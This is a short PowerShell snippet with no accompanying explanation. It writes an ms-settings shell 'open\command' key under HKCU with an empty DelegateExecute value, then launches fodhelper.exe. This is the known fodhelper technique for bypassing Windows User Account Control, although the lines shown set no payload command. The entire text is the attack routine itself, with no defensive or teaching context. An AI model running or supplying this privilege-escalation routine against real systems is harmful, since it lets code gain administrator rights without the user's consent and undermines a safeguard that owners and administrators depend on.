New-Item 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force | Out-Null
Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name DelegateExecute -Value ''
Start-Process fodhelper.exe
